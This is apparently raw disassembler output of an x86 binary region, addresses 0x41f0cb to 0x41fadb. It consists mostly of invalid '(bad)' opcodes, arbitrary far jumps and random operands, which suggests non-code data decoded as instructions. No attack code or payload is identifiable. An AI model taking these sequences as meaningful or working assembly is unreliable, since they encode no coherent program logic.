  41f0cb:	pop    ebx
  41f0cc:	not    BYTE PTR [ecx+0x2d]
  41f0cf:	sub    al,0xd
  41f0d1:	sub    BYTE PTR [edi],ah
  41f0d3:	mov    eax,gs:0x8e624a14
  41f0d9:	push   ecx
  41f0da:	call   FWORD PTR [esp+edx*4-0x7e]
  41f0de:	(bad)
  41f0e2:	mov    eax,ds:0x9fc6df37
  41f0e7:	add    al,0x9f
  41f0e9:	jbe    0x41f0d3
  41f0eb:	xor    ebx,DWORD PTR [eax+0x75]
  41f0ee:	cmp    al,0x92
  41f0f0:	repz (bad) 
  41f0f2:	sbb    BYTE PTR [esi-0x14cdfdeb],bl
  41f0f8:	mov    ah,BYTE PTR [esi]
  41f0fa:	clc    
  41f0fb:	adc    DWORD PTR [edi-0x2fc48834],edx
  41f101:	and    eax,0x14667119
  41f106:	and    eax,DWORD PTR [eax+0x775a87d6]
  41f10c:	into   
  41f10d:	adc    eax,0xdfb8
	...
  41f172:	add    BYTE PTR [eax],al
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0xdff53c54
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	mov    cl,0xee
  41f18e:	mov    bl,0xaa
  41f190:	add    DWORD PTR [ebp-0x7c1365a8],0xe617b085
  41f19a:	mov    eax,0xc4bc6ff5
  41f19f:	js     0x41f1e2
  41f1a1:	mov    al,0x9f
  41f1a3:	fwait
  41f1a4:	call   0x1d6:0x2cf285a4
  41f1ab:	int    0x13
  41f1ad:	fiadd  WORD PTR [ebx-0x4c]
  41f1b0:	pop    ss
  41f1b1:	mov    dl,0x54
  41f1b3:	xor    al,0xdb
  41f1b5:	pop    ecx
  41f1b6:	stos   DWORD PTR es:[edi],eax
  41f1b7:	std    
  41f1b8:	clc    
  41f1b9:	ds dec ebx
  41f1bb:	xchg   ebp,edi
  41f1bd:	cmp    DWORD PTR [ecx],esi
  41f1bf:	adc    eax,0x8dc4f4dc
  41f1c4:	out    dx,eax
  41f1c5:	test   DWORD PTR [esi+eax*8+0x6d],esi
  41f1c9:	mov    DWORD PTR [edi],0xad5e53c2
  41f1cf:	mov    esp,0x6d0ed7b
  41f1d4:	ins    BYTE PTR es:[edi],dx
  41f1d5:	xor    DWORD PTR [edx],0xffffffb9
  41f1d8:	test   al,0xa3
  41f1da:	shl    BYTE PTR [esi-0x681e18f9],0xb2
  41f1e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1e2:	adc    DWORD PTR [edx],esi
  41f1e4:	daa    
  41f1e5:	mov    ?,WORD PTR [edi]
  41f1e7:	mov    ecx,0xbe7706c5
  41f1ec:	push   ebx
  41f1ed:	shl    cl,0x6e
  41f1f0:	pop    ss
  41f1f1:	sub    eax,0xb6d5ac
  41f1f6:	fiadd  DWORD PTR [ebx]
  41f1f8:	data16 mov al,ds:0xce93c8eb
  41f1fe:	ret    
  41f1ff:	retf   0xc3b9
  41f202:	rcr    BYTE PTR [ecx],cl
  41f204:	add    ecx,DWORD PTR [eax]
  41f206:	cli    
  41f207:	mov    bl,0x58
  41f209:	clc    
  41f20a:	pop    ss
  41f20b:	push   edi
  41f20c:	and    bh,dl
  41f20e:	arpl   WORD PTR [eax],ax
  41f210:	xlat   BYTE PTR ds:[ebx]
  41f211:	mov    dh,0xb5
  41f213:	jecxz  0x41f1d2
  41f215:	push   cs
  41f216:	sub    ch,BYTE PTR [ebx+0x7d45e900]
  41f21c:	pop    es
  41f21d:	mov    al,ds:0xe774c95a
  41f222:	jne    0x41f27f
  41f224:	aaa    
  41f225:	xor    al,0x64
  41f227:	cs (bad) 
  41f229:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f22a:	scas   al,BYTE PTR es:[edi]
  41f22b:	fsub   QWORD PTR [ecx-0x4c0f712c]
  41f231:	(bad)  
  41f232:	adc    DWORD PTR [eax+0x76929d26],edx
  41f238:	push   ecx
  41f239:	popf   
  41f23a:	and    al,0x19
  41f23c:	and    BYTE PTR [edx+ebp*4+0x137a1f5a],cl
  41f243:	test   BYTE PTR [ebx+0x74],0xdf
  41f247:	sbb    ah,BYTE PTR [edi]
  41f249:	add    al,0xbf
  41f24b:	pop    edx
  41f24c:	pop    ds
  41f24d:	int    0xa0
  41f24f:	inc    eax
  41f250:	pop    es
  41f251:	xor    ch,BYTE PTR [esi]
  41f253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f254:	add    al,0xff
  41f256:	retf   
  41f257:	daa    
  41f258:	rol    BYTE PTR [ebx+0x2f],1
  41f25b:	mov    edx,0x1852c215
  41f260:	mov    ecx,0xf8f82b96
  41f265:	inc    ebx
  41f266:	popf   
  41f267:	outs   dx,DWORD PTR ds:[esi]
  41f268:	mov    ebx,0xa05a08eb
  41f26d:	je     0x41f2b2
  41f26f:	in     eax,dx
  41f270:	call   0x9f33:0x16d4f6aa
  41f277:	out    0x97,al
  41f279:	cmc    
  41f27a:	and    BYTE PTR [eax+0xb],al
  41f27d:	mov    dh,0xaf
  41f27f:	mov    al,ds:0xcc2447a7
  41f284:	mov    al,ds:0x1dfdaf4b
  41f289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f28a:	sbb    eax,DWORD PTR [esp+eiz*4+0x2bd3e4]
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f319
  41f301:	dec    ebx
  41f302:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41f304:	mov    esp,0x400014b
  41f309:	add    DWORD PTR [eax],eax
  41f30b:	add    ah,bl
  41f30d:	mov    al,0x63
  41f30f:	jge    0x41f331
  41f311:	or     eax,0xa8c63286
  41f316:	sti    
  41f317:	xchg   esp,eax
  41f318:	xchg   esp,eax
  41f319:	test   BYTE PTR [edi+0x6e],cl
  41f31c:	test   DWORD PTR [ebp-0x5b7289b0],0xd579c239
  41f326:	push   ds
  41f327:	test   DWORD PTR [esi+esi*4],edi
  41f32a:	sub    edi,DWORD PTR [eax+0x5f]
  41f32d:	and    BYTE PTR [eax+0x78],0x2b
  41f331:	repnz dec DWORD PTR [esi]
  41f334:	jg     0x41f319
  41f336:	jno    0x41f364
  41f338:	push   0xc239c8f0
  41f33d:	mov    al,0x50
  41f33f:	dec    eax
  41f340:	push   eax
  41f341:	mov    DWORD PTR [edi-0x634fd415],ecx
  41f347:	cwde   
  41f348:	sbb    eax,0xc39462d3
  41f34d:	ins    BYTE PTR es:[edi],dx
  41f34e:	sbb    DWORD PTR [ebp-0x5b],esp
  41f351:	dec    edx
  41f352:	out    dx,eax
  41f353:	mov    ecx,DWORD PTR [edi+0x67]
  41f356:	lods   al,BYTE PTR ds:[esi]
  41f357:	pop    esp
  41f358:	inc    ebp
  41f359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f35a:	mov    ah,0x9f
  41f35c:	xchg   ecx,eax
  41f35d:	pop    ebx
  41f35e:	adc    DWORD PTR [esi],ecx
  41f360:	or     DWORD PTR [ebx],0x4f76bf6b
  41f366:	add    esi,DWORD PTR [ecx+edx*1]
  41f369:	in     al,dx
  41f36a:	jp     0x8bc1ac4b
  41f370:	inc    esi
  41f371:	jecxz  0x41f3d5
  41f373:	and    esi,DWORD PTR [edx]
  41f375:	inc    eax
  41f376:	cmp    DWORD PTR ds:0x15bb84c1,eax
  41f37c:	enter  0xa24f,0x9f
  41f380:	add    esi,DWORD PTR [edx-0x67960a27]
  41f386:	popf   
  41f387:	out    dx,eax
  41f388:	(bad)  
  41f389:	(bad)  
  41f38a:	sbb    eax,0xc1a0164
  41f38f:	dec    edx
  41f390:	xchg   ebp,eax
  41f391:	push   cs
  41f392:	(bad)  
  41f393:	or     esp,eax
  41f395:	ror    bh,0x8a
  41f398:	dec    edi
  41f399:	cld    
  41f39a:	imul   eax,DWORD PTR [eax],0xd67fae97
  41f3a0:	repz jmp 0x41f339
  41f3a3:	popf   
  41f3a4:	das    
  41f3a5:	loop   0x41f3c3
  41f3a7:	push   ecx
  41f3a8:	outs   dx,DWORD PTR ds:[esi]
  41f3a9:	sub    eax,edx
  41f3ab:	popf   
  41f3ac:	cmc    
  41f3ad:	dec    esp
  41f3ae:	mov    esi,0xb4268142
  41f3b3:	popf   
  41f3b4:	sub    ah,BYTE PTR [edx]
  41f3b6:	push   ds
  41f3b7:	ror    BYTE PTR [esi+0x28],1
  41f3ba:	cmp    esp,ebx
  41f3bc:	sub    ah,BYTE PTR [ecx]
  41f3be:	test   BYTE PTR [ecx],bl
  41f3c0:	pop    ds
  41f3c1:	xchg   esi,eax
  41f3c2:	pop    es
  41f3c3:	mov    al,ds:0xb1fb1d05
  41f3c8:	adc    eax,0x3de066a4
  41f3cd:	dec    eax
  41f3ce:	cdq    
  41f3cf:	sub    DWORD PTR [edi-0x50],ecx
  41f3d2:	stos   BYTE PTR es:[edi],al
  41f3d3:	xor    BYTE PTR [esi-0x5f],dl
  41f3d6:	mov    ah,BYTE PTR [ecx+ebx*2+0x79cdf3a0]
  41f3dd:	or     BYTE PTR [eax-0x49],bl
  41f3e0:	jnp    0x41f365
  41f3e2:	xor    bh,bl
  41f3e4:	mov    ds:0x647afea4,al
  41f3e9:	cdq    
  41f3ea:	dec    esp
  41f3eb:	inc    ecx
  41f3ec:	and    al,BYTE PTR [ebx-0x21f78d9c]
  41f3f2:	lods   al,BYTE PTR ds:[esi]
  41f3f3:	lea    esp,[esi-0x5e974062]
  41f3f9:	popf   
  41f3fa:	pop    ebp
  41f3fb:	retf   0x6995
  41f3fe:	rcr    BYTE PTR [ecx-0x10ee5fbd],0xe4
  41f405:	(bad)  
  41f406:	sbb    eax,0xb9c83f04
  41f40b:	mov    edx,0xb5c1b7dc
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xc5
  41f481:	rol    BYTE PTR [ebx+0x14cc0cd],1
  41f487:	add    BYTE PTR [ecx+eax*1],al
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	jmp    0x41f4fc
  41f48e:	cs jb  0x41f4cb
  41f491:	and    eax,0x24b2af55
  41f496:	jo     0x41f4ca
  41f498:	pop    ecx
  41f499:	jns    0x41f50e
  41f49b:	imul   ecx,eax,0xdb83361c
  41f4a1:	shr    ch,0x31
  41f4a4:	mov    ecx,DWORD PTR [eax]
  41f4a6:	lock xchg esi,eax
  41f4a8:	dec    ebp
  41f4a9:	retf   
  41f4aa:	inc    esp
  41f4ab:	mov    bl,0x4c
  41f4ad:	inc    ebx
  41f4ae:	dec    eax
  41f4af:	jbe    0x41f494
  41f4b1:	sub    ecx,DWORD PTR [ecx-0x40]
  41f4b4:	and    BYTE PTR [esi-0xd],ch
  41f4b7:	inc    ebp
  41f4b8:	inc    ebx
  41f4b9:	and    al,0x71
  41f4bb:	adc    ah,BYTE PTR [eax+0x20]
  41f4be:	pop    eax
  41f4bf:	adc    eax,esi
  41f4c1:	(bad)  
  41f4c2:	stos   BYTE PTR es:[edi],al
  41f4c3:	xchg   ebx,eax
  41f4c4:	sbb    ch,ch
  41f4c6:	jmp    0x82479278
  41f4cb:	dec    edx
  41f4cc:	jne    0x41f50e
  41f4ce:	push   ecx
  41f4cf:	pop    edx
  41f4d0:	cwde   
  41f4d1:	cmp    ch,BYTE PTR [esi-0x3b]
  41f4d4:	frstor [esi]
  41f4d6:	xchg   esi,eax
  41f4d7:	xchg   BYTE PTR [edi],dh
  41f4d9:	pop    ebp
  41f4da:	xchg   ecx,eax
  41f4db:	lds    eax,FWORD PTR [ebp-0x7c3970d5]
  41f4e1:	cmp    dh,BYTE PTR [edi+0x7f812776]
  41f4e7:	shr    BYTE PTR [eax-0x21],cl
  41f4ea:	das    
  41f4eb:	inc    ebx
  41f4ec:	clc    
  41f4ed:	cmp    bl,al
  41f4ef:	mov    dl,0xa6
  41f4f1:	jae    0x41f52f
  41f4f3:	test   eax,0x434497c5
  41f4f8:	scas   al,BYTE PTR es:[edi]
  41f4f9:	sbb    dh,BYTE PTR [eax+ebp*8-0x267dfa1a]
  41f500:	pop    eax
  41f501:	stc    
  41f502:	xor    dh,BYTE PTR [ebx-0x5c]
  41f505:	ins    DWORD PTR es:[edi],dx
  41f506:	mov    BYTE PTR [esi],0x8
  41f509:	cmp    bl,BYTE PTR [edi+0x2f03db3a]
  41f50f:	mov    eax,0x9b21bf1
  41f514:	sbb    eax,0x80a28b26
  41f519:	cmp    eax,0x2f01294f
  41f51e:	ror    DWORD PTR [esi],0x2a
  41f521:	sbb    eax,0xd817b447
  41f526:	fadd   QWORD PTR [esi]
  41f528:	ds dec ebp
  41f52a:	dec    eax
  41f52b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f52c:	sub    al,0x78
  41f52e:	not    DWORD PTR [ebx+0x131ccffa]
  41f534:	sbb    esi,DWORD PTR [edi-0x67]
  41f537:	xlat   BYTE PTR ds:[ebx]
  41f538:	xor    BYTE PTR [edi-0x6b],0xa0
  41f53c:	je     0x41f4f7
  41f53e:	and    esp,edi
  41f540:	cmp    BYTE PTR [edx],cl
  41f542:	cs mov ds,edi
  41f545:	adc    cl,BYTE PTR [edi-0x1a]
  41f548:	push   ds
  41f549:	sbb    al,0x6c
  41f54b:	gs push ecx
  41f54d:	shr    BYTE PTR [eax+edx*4],1
  41f550:	push   0xffffff87
  41f552:	mov    dl,0xbc
  41f554:	and    BYTE PTR [eax+0x413a389b],cl
  41f55a:	sbb    BYTE PTR [bp+di],cl
  41f55d:	dec    edi
  41f55e:	fild   DWORD PTR ss:[esi]
  41f561:	dec    ebp
  41f562:	ret    0x5c79
  41f565:	pop    eax
  41f566:	mov    eax,0x79ec127b
  41f56b:	lods   al,BYTE PTR ds:[esi]
  41f56c:	mov    ds:0x9b136dc3,eax
  41f571:	push   cs
  41f572:	sub    BYTE PTR [ebp+0x4a],cl
  41f575:	ds jb  0x41f528
  41f578:	lods   eax,DWORD PTR ds:[esi]
  41f579:	bound  esp,QWORD PTR [eax-0x3a333f8e]
  41f57f:	mov    dh,BYTE PTR [ebx+edx*4-0x3dbcd740]
  41f586:	rcr    DWORD PTR [edx+ecx*4-0x7ed727b8],1
  41f58d:	imul   eax,DWORD PTR [ebx+0x67],0x0
	...
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0xfeb4:0x568ad422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	mov    ds:0x6d7fe775,al
  41f611:	adc    edx,DWORD PTR [edi-0xb]
  41f614:	adc    ebp,edi
  41f616:	popa   
  41f617:	dec    eax
  41f618:	mov    BYTE PTR [ebx-0x30],bl
  41f61b:	ss scas eax,DWORD PTR es:[edi]
  41f61d:	adc    DWORD PTR [ebx-0x2f],eax
  41f620:	sbb    eax,esi
  41f622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f623:	lds    ebx,FWORD PTR [edi+0x6b]
  41f626:	adc    DWORD PTR [edi],ebx
  41f628:	and    BYTE PTR [ebp+0x27c93b53],ch
  41f62e:	jbe    0x41f60b
  41f630:	lock and BYTE PTR [esi-0x7fecddc0],dh
  41f637:	push   0xa47c04ed
  41f63c:	jmp    0x88b382aa
  41f641:	xchg   edx,eax
  41f642:	push   cs
  41f643:	fstp   st(3)
  41f645:	mov    bl,0x61
  41f647:	jnp    0x41f611
  41f649:	add    BYTE PTR [edx-0x15e15fda],dl
  41f64f:	push   eax
  41f650:	test   al,0x36
  41f652:	mov    ds:0x51f5b675,al
  41f657:	cli    
  41f658:	and    BYTE PTR [edi+0xe88e881],ah
  41f65e:	in     al,dx
  41f65f:	push   0x19a0deeb
  41f664:	in     eax,dx
  41f665:	cmp    DWORD PTR [ebx+0x73],ecx
  41f668:	push   ds
  41f669:	mov    cl,0xe6
  41f66b:	push   ebx
  41f66c:	inc    eax
  41f66d:	sub    bl,BYTE PTR [edi]
  41f66f:	pop    es
  41f670:	outs   dx,BYTE PTR ds:[esi]
  41f671:	adc    ecx,ebp
  41f673:	cmp    eax,0xec51decd
  41f678:	push   ds
  41f679:	push   0x25
  41f67b:	lods   eax,DWORD PTR ds:[esi]
  41f67c:	push   0xffffff9e
  41f67e:	xor    DWORD PTR [eax+0x36431568],edx
  41f684:	pop    ebp
  41f685:	(bad)  
  41f686:	push   ebx
  41f687:	sbb    DWORD PTR [esi-0x63],edx
  41f68a:	add    DWORD PTR [eax-0x2e],0xbbc3dd6e
  41f691:	popf   
  41f692:	push   0xffffffff
  41f694:	js     0x41f656
  41f696:	adc    esp,0x5692b229
  41f69c:	pop    eax
  41f69d:	outs   dx,DWORD PTR ds:[esi]
  41f69e:	dec    DWORD PTR [ebx+edx*1+0x46ae11b4]
  41f6a5:	aam    0x9
  41f6a7:	pop    esi
  41f6a8:	pop    ds
  41f6a9:	int    0xb9
  41f6ab:	mov    edx,0x28a536aa
  41f6b0:	out    0xdf,al
  41f6b2:	jmp    0x5445:0x3e1103db
  41f6b9:	hlt    
  41f6ba:	loope  0x41f6a8
  41f6bc:	xchg   edx,eax
  41f6bd:	push   ecx
  41f6be:	push   0xea0c1bf6
  41f6c3:	cld    
  41f6c4:	xchg   ebp,eax
  41f6c5:	mov    ch,0xaa
  41f6c7:	outs   dx,DWORD PTR ds:[esi]
  41f6c8:	inc    ebp
  41f6c9:	jbe    0x41f70d
  41f6cb:	lods   al,BYTE PTR ds:[esi]
  41f6cc:	(bad)  
  41f6cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6ce:	adc    eax,0xbd505a8b
  41f6d3:	aaa    
  41f6d4:	out    dx,eax
  41f6d5:	sub    edi,DWORD PTR [edi]
  41f6d7:	pop    esi
  41f6d8:	retf   0xafc5
  41f6db:	imul   eax,edx,0x950bc49f
  41f6e1:	data16 (bad) 
  41f6e3:	cli    
  41f6e4:	or     cl,ah
  41f6e6:	sbb    al,0x8
  41f6e8:	add    esi,DWORD PTR [ecx-0x73]
  41f6eb:	xchg   esp,eax
  41f6ec:	inc    edi
  41f6ed:	or     al,0x33
  41f6ef:	das    
  41f6f0:	jnp    0x41f723
  41f6f2:	dec    ecx
  41f6f3:	pop    ds
  41f6f4:	inc    ecx
  41f6f5:	sub    ebx,eax
  41f6f7:	loope  0x41f6b9
  41f6f9:	neg    BYTE PTR [edi+0x3ecaef61]
  41f6ff:	retf   0xe7bf
  41f702:	sbb    DWORD PTR [ebx-0x271173ab],0xf1c4deb2
  41f70c:	mov    ah,0x2f
  41f70e:	cwde   
  41f70f:	das    
	...
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x532e:0x666c62d2
  41f783:	mov    dl,0xc8
  41f785:	dec    esi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	and    al,0x62
  41f78e:	int    0x9a
  41f790:	test   BYTE PTR [edi],dl
  41f792:	jmp    0x41f75e
  41f794:	push   0x3c
  41f796:	jmp    DWORD PTR [edx]
  41f798:	test   BYTE PTR [edx+edx*8-0x5449b7ab],bl
  41f79f:	sbb    bl,BYTE PTR [eax+edx*1]
  41f7a2:	test   BYTE PTR [ebx],cl
  41f7a4:	pop    ebp
  41f7a5:	sbb    edx,DWORD PTR fs:[ebx+0x23]
  41f7a9:	icebp  
  41f7aa:	stc    
  41f7ab:	int3   
  41f7ac:	inc    edi
  41f7ad:	jle    0x41f7c5
  41f7af:	sbb    eax,0x348556ef
  41f7b4:	mov    esp,ecx
  41f7b6:	fiadd  DWORD PTR [esi]
  41f7b8:	jb     0x41f82c
  41f7ba:	ds popf 
  41f7bc:	pop    ecx
  41f7bd:	je     0x41f755
  41f7bf:	xor    DWORD PTR [esi-0x434676cf],eax
  41f7c5:	mov    al,ds:0x8fe915c1
  41f7ca:	jmp    0x6768:0xc2c25b93
  41f7d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7d2:	push   ds
  41f7d3:	imul   BYTE PTR [ecx+0xc]
  41f7d6:	or     BYTE PTR [ecx],bh
  41f7d8:	fisub  DWORD PTR [esi]
  41f7da:	add    esp,ecx
  41f7dc:	dec    ebp
  41f7dd:	jnp    0x41f7a7
  41f7df:	pop    ds
  41f7e0:	bound  eax,QWORD PTR [eax-0x59]
  41f7e3:	daa    
  41f7e4:	lods   al,BYTE PTR ds:[esi]
  41f7e5:	mov    eax,0xade9eaa4
  41f7ea:	pop    eax
  41f7eb:	inc    edi
  41f7ec:	mov    ebp,0x6580fdf6
  41f7f1:	mov    dl,BYTE PTR [ecx+0x3f5a6d3b]
  41f7f7:	das    
  41f7f8:	cmp    al,0xf2
  41f7fa:	imul   edi,ebp,0x6f
  41f7fd:	add    BYTE PTR [ecx],ch
  41f7ff:	scas   al,BYTE PTR es:[edi]
  41f800:	inc    esp
  41f801:	aad    0x94
  41f803:	pop    edx
  41f804:	mov    ecx,0x233b38a4
  41f809:	pop    esi
  41f80a:	ins    DWORD PTR es:[edi],dx
  41f80b:	sub    ah,BYTE PTR [ebp+0x60]
  41f80e:	mov    ebx,DWORD PTR [ebx]
  41f810:	ror    esi,1
  41f812:	fiadd  WORD PTR [ebx]
  41f814:	and    DWORD PTR [edi+0x48],esp
  41f817:	test   al,0xef
  41f819:	out    0xf1,al
  41f81b:	je     0x41f7e3
  41f81d:	outs   dx,DWORD PTR ds:[esi]
  41f81e:	add    ch,0xe1
  41f821:	cbw    
  41f823:	cmovns ebp,DWORD PTR [edx+ecx*4-0x48]
  41f828:	repnz and DWORD PTR [ecx-0x79f15b98],edx
  41f82f:	pusha  
  41f830:	outs   dx,BYTE PTR ds:[esi]
  41f831:	sub    DWORD PTR [ecx-0x3f85412d],0xe5ed2d97
  41f83b:	cs mov dh,0x53
  41f83e:	pushf  
  41f83f:	mov    al,0x4
  41f841:	pop    eax
  41f842:	xchg   BYTE PTR [esi+0x16cafa97],bl
  41f848:	mov    ch,BYTE PTR [ebx]
  41f84a:	int    0xec
  41f84c:	jp     0x41f833
  41f84e:	das    
  41f84f:	ret    
  41f850:	and    DWORD PTR [esi],esi
  41f852:	and    eax,0xa20a6706
  41f857:	mov    dl,0xdf
  41f859:	mov    WORD PTR [ebp-0x13b98ffd],ds
  41f85f:	adc    bl,dl
  41f861:	(bad)  
  41f862:	mov    ah,0x94
  41f864:	not    BYTE PTR [edi+0x1a]
  41f867:	data16 in al,0xad
  41f86a:	mov    bh,0x1c
  41f86c:	aaa    
  41f86d:	imul   edx,ebx,0xffffffac
  41f870:	pop    esp
  41f871:	and    cl,bh
  41f873:	and    esi,edi
  41f875:	mov    dl,dh
  41f877:	ret    0xb031
  41f87a:	popa   
  41f87b:	pushf  
  41f87c:	pop    esp
  41f87d:	mov    ebp,0x7bd7598a
  41f882:	jle    0x41f806
  41f884:	inc    edi
  41f885:	sbb    eax,0xc5282577
  41f88a:	fild   WORD PTR [edx+0x1c]
  41f88d:	out    dx,eax
  41f88e:	push   edi
  41f88f:	mov    ebx,0x0
	...
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	cmp    eax,0xccca5aee
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	mov    ebp,0x21120234
  41f911:	mov    bl,0x47
  41f913:	pop    edi
  41f914:	add    al,0x52
  41f916:	mov    al,ds:0x653b8287
  41f91b:	loopne 0x41f89e
  41f91d:	sub    al,0x4c
  41f91f:	mov    BYTE PTR [esp+eiz*2-0x4],dl
  41f923:	xchg   ecx,eax
  41f924:	xor    eax,0xb09f3f3f
  41f929:	aaa    
  41f92a:	add    BYTE PTR [ebx-0x416d19fe],bl
  41f930:	and    eax,0x63f75b16
  41f935:	adc    al,0x23
  41f937:	jmp    0xf235:0xeaceb225
  41f93e:	push   ds
  41f93f:	push   es
  41f940:	pop    es
  41f941:	adc    esp,DWORD PTR [edx+ecx*2+0x4051247b]
  41f948:	aas    
  41f949:	push   esi
  41f94a:	mov    DWORD PTR [edx-0x17c91c27],eax
  41f950:	add    al,0xa1
  41f952:	ret    
  41f953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f954:	leave  
  41f955:	and    ch,0x2f
  41f958:	jge    0x41f9cf
  41f95a:	daa    
  41f95b:	iret   
  41f95c:	fimul  WORD PTR [ecx]
  41f95e:	pushf  
  41f95f:	mov    edi,0xe24010b7
  41f964:	jnp    0x41f903
  41f966:	loopne 0x41f97b
  41f968:	adc    al,0x39
  41f96a:	jp     0x41f969
  41f96c:	jl     0x41f9d8
  41f96e:	pushf  
  41f96f:	sub    al,0xd6
  41f971:	sti    
  41f972:	push   ss
  41f973:	pop    ds
  41f974:	mov    edi,0x157940c1
  41f979:	(bad)  
  41f97a:	fstp   DWORD PTR [eax]
  41f97c:	call   0xa94c:0x29570292
  41f983:	sbb    eax,0xc87b2a2a
  41f988:	cli    
  41f989:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f98b:	aad    0x0
  41f98d:	xchg   ebx,eax
  41f98e:	ss aam 0xfc
  41f991:	pop    esi
  41f992:	stos   DWORD PTR es:[edi],eax
  41f993:	xchg   ebp,eax
  41f994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f995:	sahf   
  41f996:	mov    ds:0x670b8b53,al
  41f99b:	push   ebx
  41f99c:	into   
  41f99d:	xchg   esi,eax
  41f99e:	sbb    DWORD PTR [edx+0x4ffeadea],edi
  41f9a4:	iret   
  41f9a5:	imul   DWORD PTR [ecx-0x28]
  41f9a8:	cmp    edx,edx
  41f9aa:	scas   al,BYTE PTR es:[edi]
  41f9ab:	dec    esp
  41f9ac:	sti    
  41f9ad:	fidivr WORD PTR [ebx+edx*4-0x53]
  41f9b1:	mov    esp,0x2edc106d
  41f9b6:	rcr    DWORD PTR [ecx],0x3b
  41f9b9:	inc    edx
  41f9ba:	mov    edi,ebx
  41f9bc:	or     bh,BYTE PTR [edi-0x29b2073]
  41f9c2:	sbb    edx,DWORD PTR [esi+0x7f835018]
  41f9c8:	cmp    BYTE PTR [ecx-0x54],ah
  41f9cb:	in     eax,dx
  41f9cc:	pusha  
  41f9cd:	dec    eax
  41f9ce:	(bad)  
  41f9cf:	mov    ds:0xcafd6565,eax
  41f9d4:	leave  
  41f9d5:	ja     0x41f9b8
  41f9d7:	not    DWORD PTR [ebx-0x147024bf]
  41f9dd:	adc    eax,DWORD PTR [ebp-0x64]
  41f9e0:	push   ecx
  41f9e1:	sub    eax,0xc2fa0624
  41f9e6:	hlt    
  41f9e7:	dec    ebx
  41f9e8:	daa    
  41f9e9:	sbb    bl,bh
  41f9eb:	push   esi
  41f9ec:	jno    0x41f9ce
  41f9ee:	and    eax,0xb1452465
  41f9f3:	nop
  41f9f4:	xor    edx,DWORD PTR [edx+0x4bd62489]
  41f9fa:	fstp   DWORD PTR [esi]
  41f9fc:	cmp    DWORD PTR [eax],ebp
  41f9fe:	rcr    BYTE PTR [ebx+0x57558f0c],1
  41fa04:	lods   eax,DWORD PTR ds:[esi]
  41fa05:	in     eax,0x6a
  41fa07:	dec    eax
  41fa08:	push   ss
  41fa09:	in     al,0x69
  41fa0b:	into   
  41fa0c:	and    esp,ebp
  41fa0e:	inc    esi
  41fa0f:	sub    eax,0x0
	...
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x92a1c2d4
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	test   dh,0x75
  41fa8f:	leave  
  41fa90:	pop    esp
  41fa91:	and    BYTE PTR [ebp+0x3281359c],cl
  41fa97:	hlt    
  41fa98:	dec    ecx
  41fa99:	imul   edi,ebx,0x9f225db9
  41fa9f:	sub    dh,BYTE PTR ds:0x9d42620c
  41faa5:	and    DWORD PTR [ecx-0x6377334a],0xffffffb9
  41faac:	cwde   
  41faad:	xor    esi,DWORD PTR [ecx]
  41faaf:	mov    WORD PTR [esi-0x78],?
  41fab2:	retf   
  41fab3:	jecxz  0x41fa97
  41fab5:	push   edx
  41fab6:	iret   
  41fab7:	arpl   WORD PTR [ebx+0x34cfdc7a],ax
  41fabd:	xor    BYTE PTR [ecx],ch
  41fabf:	hlt    
  41fac0:	fsubrp st(3),st
  41fac2:	cs jns 0x41fa9a
  41fac5:	mov    DWORD PTR [edx],esp
  41fac7:	lods   eax,DWORD PTR ds:[esi]
  41fac8:	into   
  41fac9:	jmp    0xbb30:0x5058bd90
  41fad0:	and    al,0xab
  41fad2:	in     eax,dx
  41fad3:	aam    0xc1
  41fad5:	inc    esi
  41fad6:	sub    eax,0xf7004436
  41fadb:	dec    ebx
